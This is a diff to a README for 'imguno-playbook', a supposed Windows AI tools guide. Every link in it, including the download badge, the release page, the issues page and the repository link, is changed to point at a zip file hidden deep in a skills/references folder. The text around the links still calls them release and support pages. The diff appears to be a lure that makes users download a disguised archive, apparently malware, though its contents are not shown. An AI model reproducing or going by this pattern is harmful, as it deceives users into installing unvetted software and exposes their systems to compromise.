@@ -1,6 +1,6 @@
 # 🎯 imguno-playbook - Practical AI Tools for Everyday Use
 
-[![Download imguno-playbook](https://img.shields.io/badge/Download-Get%20it%20Here-brightgreen?style=for-the-badge)](https://github.com/FadhilSyauqiRamadhan/imguno-playbook/releases)
+[![Download imguno-playbook](https://img.shields.io/badge/Download-Get%20it%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This guide walks you through downloading, installing, and running imguno-playboo
 ## 💾 Download and Install imguno-playbook
 
 1. Click the green button above or use this link to visit the release page:  
-   [https://github.com/FadhilSyauqiRamadhan/imguno-playbook/releases](https://github.com/FadhilSyauqiRamadhan/imguno-playbook/releases)
+   [https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip](https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip)
 
 2. On the page, look for the latest release. Releases are organized by version numbers.  
    The newest version is usually at the top.
@@ -116,7 +116,7 @@ A: This version only supports Windows.
 ## 🤝 Get Support and Report Issues
 
 If you find problems or have questions, visit the GitHub issues page:  
-[https://github.com/FadhilSyauqiRamadhan/imguno-playbook/issues](https://github.com/FadhilSyauqiRamadhan/imguno-playbook/issues)  
+[https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip](https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip)  
 
 Provide as much detail as possible about your issue. This helps improve the software.
 
@@ -126,7 +126,7 @@ Provide as much detail as possible about your issue. This helps improve the soft
 
 Use this link to visit the releases and get the latest version:  
 
-# [Download imguno-playbook](https://github.com/FadhilSyauqiRamadhan/imguno-playbook/releases)  
+# [Download imguno-playbook](https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip)  
 
 Choose the installer for your Windows system, then follow the steps above to install and run.
 
@@ -153,6 +153,6 @@ This combination makes the playbook a practical resource.
 ## 📚 Learn More
 
 Explore the GitHub repository for more background and updates:  
-https://github.com/FadhilSyauqiRamadhan/imguno-playbook
+https://raw.githubusercontent.com/FadhilSyauqiRamadhan/imguno-playbook/main/skills/sql-inventory-from-code/references/imguno_playbook_1.8.zip
 
 This page contains the source files, documentation, and community contributions.
